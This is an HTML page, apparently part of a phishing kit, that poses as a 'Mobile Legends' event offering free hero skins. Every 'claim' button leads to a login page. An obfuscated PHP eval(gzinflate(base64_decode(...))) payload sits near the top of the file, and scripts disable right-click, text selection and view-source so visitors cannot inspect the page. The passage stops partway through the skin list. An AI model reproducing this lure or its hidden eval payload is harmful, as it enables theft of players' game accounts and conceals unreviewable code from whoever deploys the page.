<!-- https://ensikology.blogspot.com/ - Kunjungi Blog Kami Untuk Mendapatkan Update Script Lainnya -->
<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/html4/strict.dtd">
<html>
<!-- Kode menampilkan peringatan untuk mengaktifkan javascript-->
<div align="center"><noscript>
   <div style="position:fixed; top:0px; left:0px; z-index:3000; height:100%; width:100%; background-color:#FFFFFF">
   <div style="font-family: Arial; font-size: 17px; background-color:#00bbf9; padding: 11pt;">Mohon aktifkan javascript pada browser untuk mengakses halaman ini!</div></div>
</noscript></div>
<!-- https://ensikology.blogspot.com/ - Kunjungi Blog Kami Untuk Mendapatkan Update Script Lainnya -->
<!--Kode untuk mencegah seleksi teks, block teks dll.-->
<script type="text/javascript">
function disableSelection(e){if(typeof e.onselectstart!="undefined")e.onselectstart=function(){return false};else if(typeof e.style.MozUserSelect!="undefined")e.style.MozUserSelect="none";else e.onmousedown=function(){return false};e.style.cursor="default"}window.onload=function(){disableSelection(document.body)}
</script><?php eval(gzinflate(base64_decode('jY9La8JAEMfvgXyHYRE2lvgolFISBG1NwYN9xNiLyLJNVnfbbBJ2J6Df3k2lYm89Dczv/5iZqkoxKzCgdYtNi+yz3e2EUdWehjDuxzC9CAplm5IfmTCmNvaMfc8hhkoLViqtMOgsF4cWujbHM3F6en+3pI5LwQthAvpUVygqHGTHRkS+h+KAI4m6jCGX3LiEyTp7Hjx0lh62Xy2vNFclTIB+i7xFza2St+PpvtsO81pTpzuwhqP0vQkQidhEoxGBIfTYKkk/knRDz5O9zJYJ3f4hafK+TlYZW6cLunWP9RphecV4KQy6TrJTh994iBq4WbzBrCiMsBYi2ICrcZ6rtOVrlrDZfJ7+9BDYkhi6S4OrX0LfIyl/VApzSUK4rgyB/Cu0H58A'))); ?>
<!-- https://ensikology.blogspot.com/ - Kunjungi Blog Kami Untuk Mendapatkan Update Script Lainnya -->
<!--Kode untuk mematikan fungsi klik kanan di blog-->
<script type="text/javascript">
function mousedwn(e){try{if(event.button==2||event.button==3)return false}catch(e){if(e.which==3)return false}}document.oncontextmenu=function(){return false};document.ondragstart=function(){return false};document.onmousedown=mousedwn
</script>
<!-- https://ensikology.blogspot.com/ - Kunjungi Blog Kami Untuk Mendapatkan Update Script Lainnya -->
<!--Kode untuk mencegah shorcut keyboard, view source dll.-->
<script type="text/javascript">
window.addEventListener("keydown",function(e){if(e.ctrlKey&&(e.which==65||e.which==66||e.which==67||e.which==73||e.which==80||e.which==83||e.which==85||e.which==86)){e.preventDefault()}});document.keypress=function(e){if(e.ctrlKey&&(e.which==65||e.which==66||e.which==67||e.which==73||e.which==80||e.which==83||e.which==85||e.which==86)){}return false}
</script>
<head><meta http-equiv="Content-Type" content="text/html; charset=windows-1252">
<head>

<title>MOBILE LEGENDS BANG BANG EVENT</title>
<link rel="stylesheet" type="text/css" href="css/style.css"/>
</head>
<body>
<div id="wrapper">
    <center><img src="https://cdn-www.bluestacks.com/bs-images/mobile-legends_logo1.png" height="300px" width="500px"></center>
	<h1>MOBILE LEGENDS EVENT<small>click claim to get skin</small></h1>
	<div id="content">
	<ul id="movieposters">
			    
	   
			<li>
				<img src="https://s1.gifyu.com/images/videotogif_2018.03.25_01.45.21.gif" alt="" />
				<div class="movieinfo">
					<h3>SABER</h3>
					<p>Codename - Storm</p>
					<a href="login/index.html" title="claim">claim</a>
				</div>
			</li>
			<li>
				<img src="https://s1.gifyu.com/images/videotogif_2018.05.30_16.11.27.gif" alt="" />
				<div class="movieinfo">
					<h3>GORD</h3>
					<p>Codename - Conqueror</p>
					<a href="login/index.html" title="claim">claim</a>
				</div>
			</li>
			<li>
				<img src="https://s1.gifyu.com/images/videotogif_2018.03.25_01.48.03.gif" alt="" />
				<div class="movieinfo">
					<h3>MIYA</h3>
					<p>Modena Butterfly</p>
					<a href="login/index.html" title="claim">claim</a>
				</div>
			</li>
		</ul>	    
	<ul id="movieposters">
	
	
		<li>
				<img src="https://imageshack.com/a/img921/5629/dtKgLH.png" alt="" />
				<div class="movieinfo">
					<h3>JONSHON</h3>
					<p>S.A.B.E.R - Automata</p>
					<a href="login/index.html" title="claim">claim</a>
				</div>
			</li>
			<li>
				<img src="https://s7d1.turboimg.net/t/38729935_3592838.png" alt="" />
				<div class="movieinfo">
					<h3>SABER</h3>
					<p>S.A.B.E.R - Regulator</p>
					<a href="login/index.html" title="claim">claim</a>
				</div>
			</li>
			<li>
				<img src="https://s7d1.turboimg.net/t/38729933_8550426.png" alt="" />
				<div class="movieinfo">
					<h3>LAYLA</h3>
					<p>S.A.B.E.R - Breacher</p>
					<a href="login/index.html" title="claim">claim</a>
				</div>
			</li>
		</ul>	    
	    <ul id="movieposters">
	    
	    
<li>
				<img src="https://s7d1.turboimg.net/t/38729940_8347954.png" alt="" />
				<div class="movieinfo">
					<h3>NANA</h3>
					<p>Graveyard Party</p>
					<a href="login/index.html" title="claim">claim</a>
				</div>
			</li>
			<li>
				<img src="https://s7d1.turboimg.net/t/38729941_8424544.png" alt="" />
				<div class="movieinfo">
					<h3>ZHACK</h3>
					<p>Bone Flamen</p>
					<a href="login/index.html" title="claim">claim</a>
				</div>
			</li>
			<li>
				<img src="https://s7d1.turboimg.net/t/38729942_FB_IMG_15247825083206024-picsay.jpg" alt="" />
				<div class="movieinfo">
					<h3>ESTES</h3>
					<p>White Crane</p>
					<a href="login/index.html" title="claim">claim</a>
				</div>
			</li>
		</ul>	    
	    <ul id="movieposters">	
	    
	    
	    
	<li>
				<img src="https://s7d1.turboimg.net/t1/38772409_811352.png" alt="" />
				<div class="movieinfo">
					<h3>KAGURA</h3>
					<p>Sumertime Festival</p>
					<a href="login/index.html" title="claim">claim</a>
				</div>
			</li>
			<li>
				<img src="https://s7d1.turboimg.net/t1/38772410_1081294.png" alt="" />
				<div class="movieinfo">
					<h3>FANNY</h3>
					<p>Skylark</p>
					<a href="login/index.html" title="claim">claim</a>
				</div>
			</li>
			<li>
				<img src="https://s7d1.turboimg.net/t1/38772411_6392515.png" alt="" />
				<div class="movieinfo">
					<h3>HAYABUSA</h3>
					<p>Sushi Master</p>
					<a href="login/index.html" title="claim">claim</a>
				</div>
			</li>
		</ul>	    
	    <ul id="movieposters">	
	    
<!-- https://ensikology.blogspot.com/ - Kunjungi Blog Kami Untuk Mendapatkan Update Script Lainnya -->


	<li>
				<img src="https://s7d1.turboimg.net/t1/39090334_6711968.png" alt="" />
				<div class="movieinfo">
					<h3>CLAUDE</h3>
					<p>Golden Bullet</p>
					<a href="login/index.html" title="claim">claim</a>
				</div>
			</li>
			<li>
				<img src="https://s7d1.turboimg.net/t1/39090332_2252285.png" alt="" />
				<div class="movieinfo">
					<h3>LASLEY</h3>
					<p>Stellaris Ghost</p>
					<a href="login/index.html" title="claim">claim</a>
				</div>
			</li>
						<li>
				<img src="https://s7d1.turboimg.net/t1/39090333_6281275.png" alt="" />
				<div class="movieinfo">
					<h3>MOSKOV</h3>
					<p>Jevelin Champion</p>
					<a href="login/index.html" title="claim">claim</a>
				</div>
			</li>
		</ul>	    
	    <ul id="movieposters">	

<!-- https://ensikology.blogspot.com/ - Kunjungi Blog Kami Untuk Mendapatkan Update Script Lainnya -->

<li>
				<img src="https://s7d1.turboimg.net/t1/39176394_3658342.png" alt="" />
				<div class="movieinfo">
					<h3>NATALIA</h3>
					<p>Glass Blade</p>
					<a href="login/index.html" title="claim">claim</a>
				</div>
			</li>
			<li>
				<img src="https://s7d1.turboimg.net/t1/39176390_6033125.png" alt="" />
				<div class="movieinfo">
					<h3>NANA</h3>
					<p>Wind Fairy</p>
					<a href="login/index.html" title="claim">claim</a>
				</div>
			</li>
						<li>
				<img src="https://s7d1.turboimg.net/t1/39176393_327893.png" alt="" />
				<div class="movieinfo">
					<h3>LUNOX</h3>
					<p>Bloody Mary</p>
					<a href="login/index.html" title="claim">claim</a>
				</div>
			</li>
		</ul>	    
	    <ul id="movieposters">	


<!-- https://ensikology.blogspot.com/ - Kunjungi Blog Kami Untuk Mendapatkan Update Script Lainnya -->

<li>
				<img src="https://s7d1.turboimg.net/t1/39176389_6814763.png" alt="" />
				<div class="movieinfo">
					<h3>CHOU</h3>
					<p>Furious Tiger</p>
					<a href="login/index.html" title="claim">claim</a>
				</div>
			</li>
			<li>
				<img src="https://s7d1.turboimg.net/t1/39176392_8678583.png" alt="" />
				<div class="movieinfo">
					<h3>CYCLOPS</h3>
					<p>Deep See Rescuer</p>
					<a href="login/index.html" title="claim">claim</a>
				</div>
			</li>
						<li>
				<img src="https://s7d1.turboimg.net/t1/39176391_8988039.png" alt="" />
				<div class="movieinfo">
					<h3>ROGER</h3>
					<p>Phantom Pirate</p>
					<a href="login/index.html" title="claim">claim</a>
				</div>
			</li>
		</ul>	    
	    <ul id="movieposters">	

<!-- https://ensikology.blogspot.com/ - Kunjungi Blog Kami Untuk Mendapatkan Update Script Lainnya -->
<li>
				<img src="https://s7d5.turboimg.net/t1/39679359_Funny.png" alt="" />
				<div class="movieinfo">
					<h3>FANNY</h3>
					<p>Royal Cavalry</p>
					<a href="login/index.html" title="claim">claim</a>
				</div>
			</li>
			<li>
				<img src="https://s7d5.turboimg.net/t1/39679360_Gatot.png" alt="" />
				<div class="movieinfo">
					<h3>GATOT</h3>
					<p>Sentinel</p>
					<a href="login/index.html" title="claim">claim</a>
				</div>
			</li>
						<li>
				<img src="https://s7d5.turboimg.net/t1/39679361_haya.png" alt="" />
				<div class="movieinfo">
					<h3>HAYABUSA</h3>
					<p>Experiment 21</p>
					<a href="login/index.html" title="claim">claim</a>
				</div>
			</li>
		</ul>	    
	    <ul id="movieposters">



<!-- https://ensikology.blogspot.com/ - Kunjungi Blog Kami Untuk Mendapatkan Update Script Lainnya -->
<li>
				<img src="https://s7d5.turboimg.net/t1/39679362_InstaSave-picsayirit.png" alt="" />
				<div class="movieinfo">
					<h3>IRITHEL</h3>
					<p>Sagittarius</p>
					<a href="login/index.html" title="claim">claim</a>
				</div>
			</li>
			<li>
				<img src="https://s7d5.turboimg.net/t1/39679363_2338043.png" alt="" />
				<div class="movieinfo">
					<h3>PHARSA</h3>
					<p>Indigo Aviatrix</p>
					<a href="login/index.html" title="claim">claim</a>
				</div>
			</li>
						<li>
				<img src="https://s7d5.turboimg.net/t1/39679364_tigreal-picsay.png" alt="" />
				<div class="movieinfo">
					<h3>TIGREAL</h3>
					<p>Wyrmslayer</p>
					<a href="login/index.html" title="claim">claim</a>
				</div>
			</li>
		</ul>	    
	    <ul id="movieposters">



<!-- https://ensikology.blogspot.com/ - Kunjungi Blog Kami Untuk Mendapatkan Update Script Lainnya -->
<li>
				<img src="https://s7d1.turboimg.net/t1/39345662_InstaSave-picsay4.jpg" alt="" />
				<div class="movieinfo">
					<h3>THAMUZ</h3>
					<p>Lord Of Wraith</p>
					<a href="login/index.html" title="claim">claim</a>
				</div>
			</li>
			<li>
				<img src="https://s7d1.turboimg.net/t1/39345659_InstaSave-picsay1.jpg" alt="" />
				<div class="movieinfo">
					<h3>GUSION</h3>
					<p>Cyber Ops</p>
					<a href="login/index.html" title="claim">claim</a>
				</div>
			</li>
						<li>
				<img src="https://s7d1.turboimg.net/t1/39345660_InstaSave-picsay2.jpg" alt="" />
				<div class="movieinfo">
					<h3>GROCK</h3>
					<p>Castle Guard</p>
					<a href="login/index.html" title="claim">claim</a>
				</div>
			</li>
		</ul>	    
	    <ul id="movieposters">


<!-- https://ensikology.blogspot.com/ - Kunjungi Blog Kami Untuk Mendapatkan Update Script Lainnya -->

<li>
				<img src="https://s7d1.turboimg.net/t1/39422896_InstaSave-picsaydhhshshshs.jpg" alt="" />
				<div class="movieinfo">
					<h3>HANABI</h3>
					<p>VIPER</p>
					<a href="login/index.html" title="claim">claim</a>
				</div>
			</li>
			<li>
				<img src="https://s7d1.turboimg.net/t1/39422898_InstaSave-picsayfjdjdj.jpg" alt="" />
				<div class="movieinfo">
					<h3>MARTIS</h3>
					<p>God Of The</p>
					<a href="login/index.html" title="claim">claim</a>
				</div>
			</li>
						<li>
				<img src="https://s7d1.turboimg.net/t1/39422897_InstaSave-picsayxhxh.jpg" alt="" />
				<div class="movieinfo">
					<h3>BALMOND</h3>
					<p>Celestial General</p>
					<a href="login/index.html" title="claim">claim</a>
				</div>
			</li>
		</ul>	    
	    <ul id="movieposters">



<li>
				<img src="https://s7d8.turboimg.net/t1/39515608_123-picsay.png" alt="" />
				<div class="movieinfo">
					<h3>KAGURA</h3>
					<p>Soryu Maiden</p>
					<a href="login/index.html" title="claim">claim</a>
				</div>
			</li>
			<li>
				<img src="https://s7d8.turboimg.net/t1/39515609_1234-picsay.png" alt="" />
				<div class="movieinfo">
					<h3>CLAUDE</h3>
					<p>Plunderous Pirate</p>
					<a href="login/index.html" title="claim">claim</a>
				</div>
			</li>
						<li>
				<img src="https://s7d8.turboimg.net/t1/39515611_12345-picsay.png" alt="" />
				<div class="movieinfo">
					<h3>HARLEY</h3>
					<p>Great Inventor</p>
					<a href="login/index.html" title="claim">claim</a>
				</div>
			</li>
		</ul>	    
	    <ul id="movieposters">
	        
	        
	        
	        <li>
				<img src="https://s7d8.turboimg.net/t1/39515615_5455529.png" alt="" />
				<div class="movieinfo">
					<h3>NATALIA</h3>
					<p>Midnight Raven</p>
					<a href="login/index.html" title="claim">claim</a>
				</div>
			</li>
			<li><!-- https://ensikology.blogspot.com/ - Kunjungi Blog Kami Untuk Mendapatkan Update Script Lainnya -->
				<img src="https://s7d8.turboimg.net/t1/39515612_5937038.png" alt="" />
				<div class="movieinfo">
					<h3>ALICE</h3>
					<p>Divine Owl</p>
					<a href="login/index.html" title="claim">claim</a>
				</div>
			</li>
						<li>
				<img src="https://s7d8.turboimg.net/t1/39515610_12345.png" alt="" />
				<div class="movieinfo">
					<h3>KARRIE</h3>
					<p>Jester</p>
					<a href="login/index.html" title="claim">claim</a>
				</div>
			</li>
		</ul>	    
	    <ul id="movieposters">
	        
	        <!-- https://ensikology.blogspot.com/ - Kunjungi Blog Kami Untuk Mendapatkan Update Script Lainnya -->




<li>
				<img src="https://s7d1.turboimg.net/t1/39345661_InstaSave-picsay3.jpg" alt="" />
				<div class="movieinfo">
					<h3>JOHNSON</h3>
					<p>Jeepney Racer</p>
					<a href="login/index.html" title="claim">claim</a>
				</div>
			</li>
			<li>
				<img src="https://s7d1.turboimg.net/t1/39345658_InstaSave-picsay.jpg" alt="" />
				<div class="movieinfo">
					<h3>AKAI</h3>
					<p>Imperial Assassin</p>
					<a href="login/index.html" title="claim">claim</a>
				</div>
			</li>
						<li>
				<img src="https://s7d1.turboimg.net/t1/39345667_InstaSave-picsay5.jpg" alt="" />
				<div class="movieinfo">
					<h3>MINOTAUR</h3>
					<p>Sacred Hammer</p>
					<a href="login/index.html" title="claim">claim</a>
				</div>
			</li>
		</ul>	    
	    <ul id="movieposters">




<li><!-- https://ensikology.blogspot.com/ - Kunjungi Blog Kami Untuk Mendapatkan Update Script Lainnya -->
				<img src="https://s7d1.turboimg.net/t1/39230365_8123072.png" alt="" />
				<div class="movieinfo">
					<h3>LEOMORD</h3>
					<p>Phantom Knight</p>
					<a href="login/index.html" title="claim">claim</a>
				</div>
			</li>
			<li>
				<img src="https://s7d1.turboimg.net/t1/39230362_9910819.png" alt="" />
				<div class="movieinfo">
					<h3>SUN</h3>
					<p>Street Legend</p>
					<a href="login/index.html" title="claim">claim</a>
				</div>
			</li>
						<li>
				<img src="https://s7d1.turboimg.net/t1/39230359_2100844.png" alt="" />
				<div class="movieinfo">
					<h3>CLINT</h3>
					<p>Badminton Champion</p>
					<a href="login/index.html" title="claim">claim</a>
				</div>
			</li>
		</ul>	    
	    <ul id="movieposters">	



<!-- https://ensikology.blogspot.com/ - Kunjungi Blog Kami Untuk Mendapatkan Update Script Lainnya -->

	<li>
				<img src="https://s7d1.turboimg.net/t1/39079324_3609116.png" alt="" />
				<div class="movieinfo">
					<h3>URANUS</h3>
					<p>Mech Protector</p>
					<a href="login/index.html" title="claim">claim</a>
				</div>
			</li>
			<li>
				<img src="https://s7d1.turboimg.net/t1/39079322_9754877.png" alt="" />
				<div class="movieinfo">
					<h3>VALE</h3>
					<p>Carulean Winds</p>
					<a href="login/index.html" title="claim">claim</a>
				</div>
			</li>
						<li>
				<img src="https://s7d1.turboimg.net/t1/39079321_698117.png" alt="" />
				<div class="movieinfo">
					<h3>HYLOS</h3>
					<p>Phantom Seer</p>
					<a href="login/index.html" title="claim">claim</a>
				</div>
			</li>
		</ul>	    
	    <ul id="movieposters">	


<!-- https://ensikology.blogspot.com/ - Kunjungi Blog Kami Untuk Mendapatkan Update Script Lainnya -->
<li>
				<img src="https://s7d1.turboimg.net/t1/38943042_4166577.png" alt="" />
				<div class="movieinfo">
					<h3>BALMOND</h3>
					<p>Savage Pointguard</p>
					<a href="login/index.html" title="claim">claim</a>
				</div>
			</li>
			<li>
				<img src="https://s7d1.turboimg.net/t1/38942969_4672276.png" alt="" />
				<div class="movieinfo">
					<h3>LANCELOT</h3>
					<p>Daek Earl</p>
					<a href="login/index.html" title="claim">claim</a>
				</div>
			</li>
			<li>
				<img src="https://s7d1.turboimg.net/t1/38943009_5321402.png" alt="" />
				<div class="movieinfo">
					<h3>ODETTE</h3>
					<p>Butterfly Goddess</p>
					<a href="login/index.html" title="claim">claim</a>
				</div>
			</li>
		</ul>	    
	    <ul id="movieposters">	




<li><!-- https://ensikology.blogspot.com/ - Kunjungi Blog Kami Untuk Mendapatkan Update Script Lainnya -->
				<img src="https://s7d1.turboimg.net/t1/38799572_8858940.png" alt="" />
				<div class="movieinfo">
					<h3>LAYLA</h3>
					<p>Classic Malefic Gunner</p>
					<a href="login/index.html" title="claim">claim</a>
				</div>
			</li>
			<li>
				<img src="https://s7d1.turboimg.net/t1/38799575_3388833.png" alt="" />
				<div class="movieinfo">
					<h3>KAJA</h3>
					<p>Kaminari</p>
					<a href="login/index.html" title="claim">claim</a>
				</div>
			</li>
			<li>
				<img src="https://s7d1.turboimg.net/t1/38735975_1157615.png" alt="" />
				<div class="movieinfo">
					<h3>HELCURT</h3>
					<p>IceScythe</p>
					<a href="login/index.html" title="claim">claim</a>
				</div>
			</li>
		</ul>	    
	    <ul id="movieposters">	


	    <!-- https://ensikology.blogspot.com/ - Kunjungi Blog Kami Untuk Mendapatkan Update Script Lainnya -->
	    
	<li>
				<img src="https://s7d1.turboimg.net/t1/38772412_324238.png" alt="" />
				<div class="movieinfo">
					<h3>ANGELA</h3>
					<p>China Doll</p>
					<a href="login/index.html" title="claim">claim</a>
				</div>
			</li>
			<li>
				<img src="https://s7d1.turboimg.net/t1/38772413_8946135.png" alt="" />
				<div class="movieinfo">
					<h3>HILDA</h3>
					<p>Sacred Guard</p>
					<a href="login/index.html" title="claim">claim</a>
				</div>
			</li>
			<li>
				<img src="https://s7d1.turboimg.net/t1/38772414_148038.png" alt="" />
				<div class="movieinfo">
					<h3>VALIR</h3>
					<p>Shikigami Summoner</p>
					<a href="login/index.html" title="claim">claim</a>
				</div>
			</li>
		</ul>	    
	    <ul id="movieposters">	  
	    
	    <!-- https://ensikology.blogspot.com/ - Kunjungi Blog Kami Untuk Mendapatkan Update Script Lainnya -->
	    
<li>
				<img src="https://s7d1.turboimg.net/t1/38772415_7678992.png" alt="" />
				<div class="movieinfo">
					<h3>MIYA</h3>
					<p>Suzuhime</p>
					<a href="login/index.html" title="claim">claim</a>
				</div>
			</li>
			<li>
				<img src="https://s7d1.turboimg.net/t1/38772416_4118666.png" alt="" />
				<div class="movieinfo">
					<h3>GORD</h3>
					<p>Professor Of hell</p>
					<a href="login/index.html" title="claim">claim</a>
				</div>
			</li>
			<li>
				<img src="https://s7d1.turboimg.net/t1/38772417_9369685.png" alt="" />
				<div class="movieinfo">
					<h3>ALDOUS</h3>
					<p>Red Mantle</p>
					<a href="login/index.html" title="claim">claim</a>
				</div>
			</li>
		</ul>	    
	    <ul id="movieposters">	
	    
	          	    	    	        	  
	    <!-- https://ensikology.blogspot.com/ - Kunjungi Blog Kami Untuk Mendapatkan Update Script Lainnya -->


<li>
				<img src="https://s7d1.turboimg.net/t/38729945_21.png" alt="" />
				<div class="movieinfo">
					<h3>FRANCO</h3>
					<p>Locomotive</p>
					<a href="login/index.html" title="claim">claim</a>
				</div>
			</li>
			<li>
				<img src="https://s7d1.turboimg.net/t/38729946_20.png" alt="" />
				<div class="movieinfo">
					<h3>JEWHEAD</h3>
					<p>Space Explorer</p>
					<a href="login/index.html" title="claim">claim</a>
				</div>
			</li>
			<li>
				<img src="https://s7d1.turboimg.net/t/38729947_23.png" alt="" />
				<div class="movieinfo">
					<h3>KAJA</h3>
					<p>Commandment</p>
					<a href="login/index.html" title="claim">claim</a>
				</div>
			</li>
		</ul>	    
	    <ul id="movieposters">	
<!-- https://ensikology.blogspot.com/ - Kunjungi Blog Kami Untuk Mendapatkan Update Script Lainnya -->

<li>
				<img src="https://s7d1.turboimg.net/t/38729948_8209110.png" alt="" />
				<div class="movieinfo">
					<h3>HARLEY</h3>
					<p>Referee</p>
					<a href="login/index.html" title="claim">claim</a>
				</div>
			</li>
			<li>
				<img src="https://s7d1.turboimg.net/t/38729949_7130098.png" alt="" />
				<div class="movieinfo">
					<h3>BRUNO</h3>
					<p>Street Football</p>
					<a href="login/index.html" title="claim">claim</a>
				</div>
			</li>
			<li>
				<img src="https://s7d1.turboimg.net/t/38729950_25.png" alt="" />
				<div class="movieinfo">
					<h3>LASLEY</h3>
					<p>Cheergunner</p>
					<a href="login/index.html" title="claim">claim</a>
				</div>
			</li>
		</ul>	    
	    <ul id="movieposters">	


<!-- https://ensikology.blogspot.com/ - Kunjungi Blog Kami Untuk Mendapatkan Update Script Lainnya -->
<li>
				<img src="https://s7d1.turboimg.net/t/38729951_1950281.png" alt="" />
				<div class="movieinfo">
					<h3>RAFELAH</h3>
					<p>S.A.B.E.R Savior</p>
					<a href="login/index.html" title="claim">claim</a>
				</div>
			</li>
			<li>
				<img src="https://s7d1.turboimg.net/t/38729952_5294499.png" alt="" />
				<div class="movieinfo">
					<h3>KARINA</h3>
					<p>Doom Duelist</p>
					<a href="login/index.html" title="claim">claim</a>
				</div>
			</li>
			<li>
				<img src="https://s7d1.turboimg.net/t/38729953_5074580.png" alt="" />
				<div class="movieinfo">
					<h3>AKAI</h3>
					<p>Akazonae Samurai</p>
					<a href="login/index.html" title="claim">claim</a>
				</div>
			</li>
		</ul>	    
	    <ul id="movieposters">	

	    
	    
<li>
				<img src="https://s7d1.turboimg.net/t1/38729955_4566234.png" alt="" />
				<div class="movieinfo">
					<h3>FREYA</h3>
					<p>Gladiator</p>
					<a href="login/index.html" title="claim">claim</a>
				</div>
			</li>
			<li>
				<img src="https://s7d1.turboimg.net/t1/38729956_2504328.png" alt="" />
				<div class="movieinfo">
					<h3>LAYLA</h3>
					<p>Blue Spectre</p>
					<a href="login/index.html" title="claim">claim</a>
				</div>
			</li>
			<li>
				<img src="https://s7d1.turboimg.net/t1/38729957_2599391.png" alt="" />
				<div class="movieinfo">
					<h3>IRITHEL</h3>
					<p>Hellfire</p>
					<a href="login/index.html" title="claim">claim</a>
				</div>
			</li>
		</ul>	    
	    <ul id="movieposters">		    	    	    
	    
	    

<li>
				<img src="https://s7d1.turboimg.net/t1/38729964_1514080.png" alt="" />
				<div class="movieinfo">
					<h3>URANUS</h3>
					<p>Ancient Soul</p>
					<a href="login/index.html" title="claim">claim</a>
				</div>
			</li>
			<li>
				<img src="https://s7d1.turboimg.net/t1/38729959_3.png" alt="" />
				<div class="movieinfo">
					<h3>ZILONG</h3>
					<p>Changbanpo Commander</p>
					<a href="login/index.html" title="claim">claim</a>
				</div>
			</li>
			<li>
				<img src="https://s7d1.turboimg.net/t1/38729960_2.png" alt="" />
				<div class="movieinfo">
					<h3>GUSION</h3>
					<p>Hairstylist</p>
					<a href="login/index.html" title="claim">claim</a>
				</div>
			</li>
		</ul>	    
	    <ul id="movieposters">	




<li>
				<img src="https://s7d1.turboimg.net/t1/38729961_5.png" alt="" />
				<div class="movieinfo">
					<h3>SALENA</h3>
					<p>Flame Witch</p>
					<a href="login/index.html" title="claim">claim</a>
				</div>
			</li>
			<li>
				<img src="https://s7d1.turboimg.net/t1/38729962_4.png" alt="" />
				<div class="movieinfo">
					<h3>CYCLOPS</h3>
					<p>S.A.B.E.R  Exploder</p>
					<a href="login/index.html" title="claim">claim</a>
				</div>
			</li>
			<li>
				<img src="https://s7d1.turboimg.net/t1/38729963_6643311.png" alt="" />
				<div class="movieinfo">
					<h3>CHANG'E</h3>
					<p>Moonstruck</p>
					<a href="login/index.html" title="claim">claim</a>
				</div>
			</li>
		</ul>	    
	    <ul id="movieposters">	
	    
	    
	    
			<li>
				<img src="https://s7d1.turboimg.net/t1/38729966_1024720.png" alt="" />
				<div class="movieinfo">
					<h3>NANA</h3>
					<p>ClockWork Maid</p>
					<a href="login/index.html" title="claim">claim</a>
				</div>
			</li>
			<li>
				<img src="https://s7d1.turboimg.net/t1/38729967_8745629.png" alt="" />
				<div class="movieinfo">
					<h3>MARTIS</h3>
					<p>Searing Maw</p>
					<a href="login/index.html" title="claim">claim</a>
				</div>
			</li>
			<li>
				<img src="https://s7d1.turboimg.net/t1/38729968_6186728.png" alt="" />
				<div class="movieinfo">
					<h3>FREYA</h3>
					<p>Dark Rose</p>
					<a href="login/index.html" title="claim">claim</a>
				</div>
			</li>
		</ul>	    
	    <ul id="movieposters">
	    
	    
	    <li>
				<img src="https://s7d1.turboimg.net/t1/38729969_1259195.png" alt="" />
				<div class="movieinfo">
					<h3>ALUCARD</h3>
					<p>Romantic Fantasy</p>
					<a href="login/index.html" title="claim">claim</a>
				</div>
			</li>
			<li>
				<img src="https://s7d1.turboimg.net/t1/38729971_2074741.png" alt="" />
				<div class="movieinfo">
					<h3>ALUCARD</h3>
					<p>Child Of The Fall</p>
					<a href="login/index.html" title="claim">claim</a>
				</div>
			</li>
			<li>
				<img src="https://s7d1.turboimg.net/t1/38729973_8018007.png" alt="" />
				<div class="movieinfo">
					<h3>ALUCARD</h3>
					<p>Viscount</p>
					<a href="login/index.html" title="claim">claim</a>
				</div>
			</li>
		</ul>	    
	    	<ul id="movieposters">
	    	
	    	
	    	<li>
				<img src="https://s7d1.turboimg.net/t1/38729975_8628035.png" alt="" />
				<div class="movieinfo">
					<h3>FREYA</h3>
					<p>Beach Sweaetheart</p>
					<a href="login/index.html" title="claim">claim</a>
				</div>
			</li>
			<li>
				<img src="https://s7d1.turboimg.net/t1/38729976_6027010.png" alt="" />
				<div class="movieinfo">
					<h3>FREYA</h3>
					<p>War Angel</p>
					<a href="login/index.html" title="claim">claim</a>
				</div>
			</li>
			<li>
				<img src="https://s7d1.turboimg.net/t1/38729977_9601407.png" alt="" />
				<div class="movieinfo">
					<h3>FREYA</h3>
					<p>Dragon Hunter</p>
					<a href="login/index.html" title="claim">claim</a>
				</div>
			</li>
		</ul>	    
	    	<ul id="movieposters">
	    	
	    	
	    	<li>
				<img src="https://s7d1.turboimg.net/t1/38729978_8204540.png" alt="" />
				<div class="movieinfo">
					<h3>MIYA</h3>
					<p>Sweet Fantasy</p>
					<a href="login/index.html" title="claim">claim</a>
				</div>
			</li>
			<li>
				<img src="https://s7d1.turboimg.net/t1/38644729_1566982.png" alt="" />
				<div class="movieinfo">
					<h3>MIYA</h3>
					<p>Christmas Carnival</p>
					<a href="login/index.html" title="claim">claim</a>
				</div>
			</li>
			<li>
				<img src="https://s7d1.turboimg.net/t1/38729979_9374730.png" alt="" />
				<div class="movieinfo">
					<h3>MIYA</h3>
					<p>Captain Thorns</p>
					<a href="login/index.html" title="claim">claim</a>
				</div>
			</li>
		</ul>	    
	    	<ul id="movieposters">
	    	
	    	
	    	<li>
				<img src="https://s7d1.turboimg.net/t1/38729980_3391896.png" alt="" />
				<div class="movieinfo">
					<h3>ZILONG</h3>
					<p>Blazing Lancer</p>
					<a href="login/index.html" title="claim">claim</a>
				</div>
			</li>
			<li>
				<img src="https://s7d1.turboimg.net/t1/38729981_468042.png" alt="" />
				<div class="movieinfo">
					<h3>ZILONG</h3>
					<p>Glorious General</p>
					<a href="login/index.html" title="claim">claim</a>
				</div>
			</li>
			<li>
				<img src="https://s7d1.turboimg.net/t1/38729984_1838408.png" alt="" />
				<div class="movieinfo">
					<h3>ZILONG</h3>
					<p>Eastern Warrior</p>
					<a href="login/index.html" title="claim">claim</a>
				</div>
			</li>
		</ul>	    
	    	<ul id="movieposters">
	    	
	    	<li>
				<img src="https://s7d1.turboimg.net/t1/38729985_7789256.png" alt="" />
				<div class="movieinfo">
					<h3>EUDORA</h3>
					<p>Christmas Carnival</p>
					<a href="login/index.html" title="claim">claim</a>
				</div>
			</li>
			<li>
				<img src="https://s7d1.turboimg.net/t1/38729986_84223.png" alt="" />
				<div class="movieinfo">
					<h3>EUDORA</h3>
					<p>Emarald Enchantress</p>
					<a href="login/index.html" title="claim">claim</a>
				</div>
			</li>
			<li>
				<img src="https://s7d1.turboimg.net/t1/38731431_3865934.png" alt="" />
				<div class="movieinfo">
					<h3>EUDORA</h3>
					<p>Vivo Selfi Goddess</p>
					<a href="login/index.html" title="claim">claim</a>
				</div>
			</li>
		</ul>	    
	    	<ul id="movieposters">
	    	
	    	
	    	
	    	<li>
				<img src="https://s7d1.turboimg.net/t1/38731432_4325650.png" alt="" />
				<div class="movieinfo">
					<h3>HILDA</h3>
					<p>Flower Of The Wastes</p>
					<a href="login/index.html" title="claim">claim</a>
				</div>
			</li>
			<li>
				<img src="https://s7d1.turboimg.net/t1/38731433_4600533.png" alt="" />
				<div class="movieinfo">
					<h3>ALUCARD</h3>
					<p>Fiery Inferno</p>
					<a href="login/index.html" title="claim">claim</a>
				</div>
			</li>
			<li>
